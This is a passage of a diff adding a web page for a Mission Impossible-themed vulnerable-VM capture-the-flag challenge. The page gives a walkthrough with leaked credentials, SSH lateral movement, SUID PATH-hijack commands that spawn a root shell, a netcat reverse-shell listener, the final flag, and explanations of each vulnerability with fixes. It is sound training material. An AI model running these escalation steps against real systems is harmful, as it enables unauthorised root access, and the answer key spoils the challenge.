+            <div class="code-block-header"><span class="code-block-lang">bash</span></div>
+            <pre>cat /var/www/uploads/.secret_clue.txt
+<span class="cm"># Username: ethan_hunt</span>
+<span class="cm"># Password: IMF_Protocol_2024</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- Phase 2 -->
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span><span class="badge badge-purple" style="margin-right:0.5rem">Phase 2</span> Lateral Movement (ethan_hunt)</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">bash</span></div>
+            <pre>ssh ethan_hunt@&lt;TARGET_IP&gt;
+<span class="cm"># Password: IMF_Protocol_2024</span>
+
+cat ~/MISSION_BRIEFING.txt
+<span class="cm"># Points to Ghost Protocol on port 8081</span></pre>
+          </div>
+          <p>Visit <code>http://&lt;TARGET_IP&gt;:8081</code> — explore all 5 pages, especially <strong>ethan_personal.php</strong>.</p>
+          <h4>Step 4: View Page Source</h4>
+          <p>Right-click on <code>ethan_personal.php</code> → View Page Source → scroll to bottom:</p>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">html</span></div>
+            <pre><span class="cm">&lt;!--</span>
+<span class="cm">  Username: luther_stickell</span>
+<span class="cm">  Password: HackerInChief_1996</span>
+<span class="cm">--&gt;</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- Phase 3 -->
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span><span class="badge badge-yellow" style="margin-right:0.5rem">Phase 3</span> Privilege Escalation (luther_stickell)</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">bash</span></div>
+            <pre>ssh luther_stickell@&lt;TARGET_IP&gt;
+<span class="cm"># Password: HackerInChief_1996</span>
+
+<span class="cm"># Find SUID binaries</span>
+find / -perm -4000 2>/dev/null
+
+<span class="cm"># Locate unusual binary</span>
+ls -la /tmp/secret_mission</pre>
+          </div>
+          <h4>Step 4: Exploit SUID</h4>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">bash</span></div>
+            <pre><span class="cm"># Execute SUID binary (runs as root)</span>
+/tmp/secret_mission
+
+<span class="cm"># For root shell via PATH hijack:</span>
+cd /tmp
+echo '#!/bin/bash' > cat
+echo '/bin/bash -p' >> cat
+chmod +x cat
+export PATH=/tmp:$PATH
+/tmp/secret_mission</pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- Phase 4 -->
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span><span class="badge badge-green" style="margin-right:0.5rem">Phase 4</span> Root Access &amp; Flag Capture</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <p>After executing the SUID binary you'll see <code>/root/FINAL_MISSION.txt</code>:</p>
+          <div class="flag-box">
+            <p style="color:var(--green); font-family:var(--font-mono); font-size:0.75rem; margin-bottom:0.5rem;">🚩 FLAG CAPTURED</p>
+            <code>IMF{M1SS10N_1MP0SS1BL3_C0MPL3T3D_Y0U_4R3_TH3_M4ST3R_4G3NT}</code>
+          </div>
+          <p>Congratulations, Agent! Mission complete. 🎯</p>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Attack Chain -->
+    <div class="card reveal" style="margin-top:2rem;">
+      <h3 style="color:var(--accent); margin-bottom:1rem; font-family:var(--font-mono);">// Attack Chain Summary</h3>
+      <div class="code-block">
+        <pre>1. 🔍 nmap scan → ports 80, 8080, 8081 open
+2. 🌐 Port 80 → hint to port 8080
+3. 📤 upload.php (port 8080) → unrestricted file upload
+4. 🐚 Upload PHP reverse shell → RCE as www-data
+5. 🔑 .secret_clue.txt → ethan_hunt:IMF_Protocol_2024
+6. 🔐 SSH as ethan_hunt
+7. 🌐 Port 8081 Ghost Protocol site
+8. 👀 Page source → luther_stickell:HackerInChief_1996
+9. 🔐 SSH as luther_stickell
+10. 🔎 find SUID → /tmp/secret_mission
+11. ⚡ Execute SUID → root shell
+12. 🚩 cat /root/FINAL_MISSION.txt → FLAG!</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ VULNERABILITIES ═══════════════ -->
+<section class="section" id="vulnerabilities">
+  <div class="container">
+    <p class="section-label reveal">// vuln_analysis.sh</p>
+    <h2 class="section-title reveal">Vulnerabilities <span>Explained</span></h2>
+
+    <div class="accordion reveal">
+
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span><span class="badge badge-red" style="margin-right:0.5rem">CRITICAL</span> Unrestricted File Upload</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <p><strong>Location:</strong> <code>/upload.php</code> on port 8080</p>
+          <p>The file upload accepts any file type without validation, allowing PHP scripts to be uploaded.</p>
+          <h4 class="red">Vulnerable Code:</h4>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">php</span></div>
+            <pre><span class="ck">&lt;?php</span>
+<span class="cm">// NO FILE TYPE VALIDATION!</span>
+if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+    echo "File uploaded successfully!";
+}
+<span class="ck">?&gt;</span></pre>
+          </div>
+          <h4 class="green">Fix:</h4>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">php</span></div>
+            <pre>$allowed = ['jpg','jpeg','png','gif','pdf'];
+$ext = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
+if (!in_array($ext, $allowed)) { die("Invalid file type!"); }
+<span class="cm">// Also validate MIME type with finfo_file()</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span><span class="badge badge-yellow" style="margin-right:0.5rem">HIGH</span> Information Disclosure via HTML Comments</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <p>Credentials stored in HTML comments visible to anyone via View Source.</p>
+          <h4 class="red">Vulnerable Code:</h4>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">html</span></div>
+            <pre><span class="cm">&lt;!-- Username: luther_stickell  Password: HackerInChief_1996 --&gt;</span></pre>
+          </div>
+          <h4 class="green">Fix:</h4>
+          <ul>
+            <li>Never store credentials in client-side code</li>
+            <li>Remove all sensitive comments before deployment</li>
+            <li>Use environment variables / secrets manager</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span><span class="badge badge-red" style="margin-right:0.5rem">CRITICAL</span> SUID Binary Misconfiguration</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <p>Root-owned binary with SUID bit calls <code>system()</code>, enabling PATH hijack for privesc.</p>
+          <h4 class="red">Vulnerable Code:</h4>
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">c</span></div>
+            <pre>setuid(0); setgid(0);
+system("/bin/cat /root/FINAL_MISSION.txt"); <span class="cm">// PATH hijackable</span></pre>
+          </div>
+          <h4 class="green">Fix:</h4>
+          <ul>
+            <li>Avoid SUID binaries — use <code>sudo</code> with explicit rules instead</li>
+            <li>Never use <code>system()</code> in SUID programs</li>
+            <li>Use <code>execve()</code> with full absolute paths</li>
+            <li>Audit regularly: <code>find / -perm -4000 2>/dev/null</code></li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span><span class="badge badge-blue" style="margin-right:0.5rem">MEDIUM</span> Weak Password Policy</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <p>Predictable, thematic passwords across accounts:</p>
+          <ul>
+            <li><code>ethan_hunt : IMF_Protocol_2024</code></li>
+            <li><code>luther_stickell : HackerInChief_1996</code></li>
+          </ul>
+          <h4 class="green">Fix:</h4>
+          <ul>
+            <li>Enforce 12+ character complex passwords</li>
+            <li>Enable MFA on all accounts</li>
+            <li>Prefer SSH key-based authentication</li>
+          </ul>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Learning objectives -->
+    <div class="card reveal" style="margin-top:1.5rem;">
+      <h3 style="margin-bottom:1rem;">Learning Objectives</h3>
+      <div class="grid-2">
+        <div>
+          <p>✅ Network recon with nmap</p>
+          <p>✅ Web application enumeration</p>
+          <p>✅ File upload vulnerability exploitation</p>
+          <p>✅ PHP reverse shell creation</p>
+        </div>
+        <div>
+          <p>✅ SUID binary privilege escalation</p>
+          <p>✅ Source code analysis for credentials</p>
+          <p>✅ Lateral movement techniques</p>
+          <p>✅ Post-exploitation methodology</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ TOOLS ═══════════════ -->
+<section class="section" id="tools">
+  <div class="container">
+    <p class="section-label reveal">// required_tools.sh</p>
+    <h2 class="section-title reveal">Required <span>Tools</span></h2>
+    <p class="section-desc reveal">All tools are pre-installed on Kali Linux.</p>
+
+    <div class="grid-3 reveal">
+      <div class="tool-card">
+        <div class="tool-icon">🔍</div>
+        <h3>Nmap</h3>
+        <p>Network scanning and port discovery</p>
+        <div class="code-block"><pre>apt install nmap</pre></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-icon">🌐</div>
+        <h3>Gobuster</h3>
+        <p>Directory and file brute-forcing</p>
+        <div class="code-block"><pre>apt install gobuster</pre></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-icon">🐚</div>
+        <h3>Netcat</h3>
+        <p>Reverse shell listener</p>
+        <div class="code-block"><pre>apt install netcat</pre></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-icon">🔐</div>
+        <h3>SSH Client</h3>
+        <p>Remote access to target</p>
+        <div class="code-block"><pre>apt install openssh-client</pre></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-icon">🦊</div>
+        <h3>Firefox / Burp Suite</h3>
+        <p>Web application testing</p>
+        <p style="font-size:0.75rem; color:var(--muted);">Pre-installed on Kali</p>
+      </div>
+      <div class="tool-card">
+        <div class="tool-icon">📝</div>
+        <h3>Text Editor</h3>
+        <p>Edit shells and scripts</p>
+        <div class="code-block"><pre>nano / vim</pre></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ FAQ ═══════════════ -->
+<section class="section" id="faq">
+  <div class="container">
+    <p class="section-label reveal">// faq.sh</p>
+    <h2 class="section-title reveal">Frequently Asked <span>Questions</span></h2>
+
+    <div class="accordion reveal">
+
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span>Can't find the VM's IP address?</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <ol>
+            <li>Login to VM console → run <code>ip addr show</code></li>
+            <li>From Kali → <code>nmap -sn 192.168.1.0/24</code></li>
+            <li>Use <code>arp-scan -l</code></li>
+            <li>Check router's DHCP client list</li>
+          </ol>
+        </div>
+      </div>
+
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span>Reverse shell not connecting?</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <ol>
+            <li>Verify your Kali IP in the PHP shell file</li>
+            <li>Check firewall: <code>sudo ufw status</code></li>
+            <li>Ensure listener is running: <code>nc -lvnp 4444</code></li>
+            <li>Access the shell URL directly in browser</li>
+            <li>Check Apache error logs for PHP errors</li>
+          </ol>
+        </div>
+      </div>
+
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span>Can't find the SUID binary?</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <div class="code-block">
+            <div class="code-block-header"><span class="code-block-lang">bash</span></div>
+            <pre><span class="cm"># Try these locations:</span>
+ls -la /tmp/secret_mission
+ls -la /usr/local/bin/secret_mission
+ls -la /home/ilsa_faust/secret_mission
+
+<span class="cm"># Search for it:</span>
+find / -name "secret_mission" 2>/dev/null
+find / -perm -4000 2>/dev/null | grep secret</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span>What if I get stuck?</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <ul>
+            <li>Read all mission briefing files — they contain clues</li>
+            <li>Always <strong>View Page Source</strong> on web pages</li>
+            <li>Check <code>.bash_history</code> files</li>
+            <li>Look for hidden files with <code>ls -la</code></li>
+            <li>Refer to the complete walkthrough above</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion(this)">
+          <span>Is this machine safe to run?</span>
+          <span class="accordion-arrow">▼</span>
+        </div>
+        <div class="accordion-body">
+          <p>Only safe in isolated environments:</p>
+          <ul>
+            <li>✅ VirtualBox with Host-Only or NAT network</li>
+            <li>✅ Isolated home lab without internet</li>
+            <li>❌ Do NOT expose to the internet</li>
+            <li>❌ Do NOT run on public cloud without isolation</li>
+          </ul>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ CONTACT ═══════════════ -->
+<section class="section" id="contact">
+  <div class="container">
+    <p class="section-label reveal">// contact.sh</p>
+    <h2 class="section-title reveal">Contact &amp; <span>Feedback</span></h2>
+    <p class="section-desc reveal">Did you enjoy this challenge? Found bugs or have suggestions? I'd love to hear from you.</p>
+
+    <div class="grid-2 reveal">
+      <div>
+        <a href="ahammednizara@gmail.com" class="contact-link">
+          <span class="icon">📧</span>
+          <div>
+            <div style="font-weight:500;">Email</div>
+            <div style="color:var(--muted); font-size:0.8rem;">ahammednizara@gmail.com</div>
+          </div>
+        </a>
+        <a href="https://github.com/ahammednizar" class="contact-link" target="_blank">
+          <span class="icon">🐙</span>
+          <div>
+            <div style="font-weight:500;">GitHub</div>
+            <div style="color:var(--muted); font-size:0.8rem;">https://github.com/ahammednizar</div>
+          </div>
+        </a>
+        <a href="https:X" class="contact-link" target="_blank">
+          <span class="icon">🐦</span>
+          <div>
+            <div style="font-weight:500;">Twitter</div>
+            <div style="color:var(--muted); font-size:0.8rem;">@yourusername</div>
+          </div>
+        </a>
+        <a href="www.linkedin.com/in/ahammed-nizar-a36853137" class="contact-link" target="_blank">
+          <span class="icon">💼</span>
+          <div>
+            <div style="font-weight:500;">LinkedIn</div>
+            <div style="color:var(--muted); font-size:0.8rem;">www.linkedin.com/in/ahammed-nizar-a36853137</div>
+          </div>
+        </a>
+      </div>
+
+      <div class="card">
+        <h3 style="margin-bottom:0.75rem;">Share Your Writeup!</h3>
+        <p>Completed the challenge? Share with the community and tag it:</p>
+        <div style="margin-top:1rem;">
+          <span class="badge badge-blue">#ProjectMissionImpossible</span>
+          <span class="badge badge-blue">#CTF</span>
+          <span class="badge badge-purple">#Pentesting</span>
+          <span class="badge badge-green">#InfoSec</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ CREDITS ═══════════════ -->
+<section class="section" id="credits">
+  <div class="container">
+    <p class="section-label reveal">// credits.sh</p>
+    <h2 class="section-title reveal"><span>Credits</span> &amp; Acknowledgments</h2>
+
+    <div class="card reveal">
+      <div style="display:flex; gap:3rem; flex-wrap:wrap;">
+        <div>
+          <p style="color:var(--muted); font-size:0.85rem; margin-bottom:0.25rem;">Created by</p>
+          <p style="font-size:1.1rem; font-weight:600;">ahammednizar</p>
+        </div>
+        <div>
+          <p style="color:var(--muted); font-size:0.85rem; margin-bottom:0.25rem;">Inspired by</p>
+          <p>Mission Impossible franchise, VulnHub, TryHackMe</p>
+        </div>
+      </div>
+
+      <div style="margin-top:1.5rem; padding-top:1.5rem; border-top:1px solid var(--border);">
+        <p style="color:var(--muted); font-size:0.85rem; margin-bottom:0.75rem;">Special Thanks</p>
+        <div style="display:flex; flex-wrap:wrap; gap:0.5rem;">
+          <span class="badge badge-blue">🎬 Mission Impossible Franchise</span>
+          <span class="badge badge-blue">🛡️ VulnHub & TryHackMe</span>
+          <span class="badge badge-blue">🐚 pentestmonkey</span>
+          <span class="badge badge-blue">🐧 Debian Project</span>
+          <span class="badge badge-blue">🌐 Open Source Community</span>
+        </div>
+      </div>
+
+      <div style="margin-top:1.5rem; padding-top:1.5rem; border-top:1px solid var(--border);">
+        <p style="color:var(--muted); font-size:0.8rem; line-height:1.7;">
+          This vulnerable machine is created purely for educational purposes. The author is not responsible for any misuse. Always obtain proper authorization before testing security on systems you don't own. Practice ethical hacking and responsible disclosure.
+        </p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ FOOTER ═══════════════ -->
+<footer>
+  <div class="footer-logo">&lt;<span>Project Mission Impossible</span> /&gt;</div>
+  <p>© 2024 CTF Challenge — Created for educational purposes. Use responsibly.</p>
+  <p style="margin-top:0.75rem;">
+    <a href="#home">↑ Back to Top</a>
+  </p>
+</footer>
+
+<script>
+  // ── Accordion ──
+  function toggleAccordion(header) {
+    const item = header.parentElement;
+    const body = header.nextElementSibling;
+    const isOpen = item.classList.contains('open');
+
+    // Close all
+    document.querySelectorAll('.accordion-item').forEach(i => {
+      i.classList.remove('open');
+      i.querySelector('.accordion-body').classList.remove('open');
+    });
+
+    // Open clicked (if it was closed)
+    if (!isOpen) {
+      item.classList.add('open');
+      body.classList.add('open');
+    }
+  }
+
+  // ── Scroll Reveal ──
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        e.target.classList.add('visible');
+        observer.unobserve(e.target);
+      }
+    });
+  }, { threshold: 0.1 });
+
+  document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
+
+  // ── Active nav link on scroll ──
+  const sections = document.querySelectorAll('section[id]');
+  window.addEventListener('scroll', () => {
+    const pos = window.scrollY + 80;
+    sections.forEach(s => {
+      const link = document.querySelector(`.nav-links a[href="#${s.id}"]`);
+      if (!link) return;
+      if (s.offsetTop <= pos && s.offsetTop + s.offsetHeight > pos) {
+        document.querySelectorAll('.nav-links a').forEach(a => a.style.color = '');
+        link.style.color = 'var(--accent)';
+      }
+    });
+  });
+
+  // ── Smooth Scroll ──
+  document.querySelectorAll('a[href^="#"]').forEach(a => {
+    a.addEventListener('click', e => {
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) {
+        e.preventDefault();
+        target.scrollIntoView({ behavior: 'smooth' });
+      }
+    });
+  });
+</script>
+
+</body>
+</html>
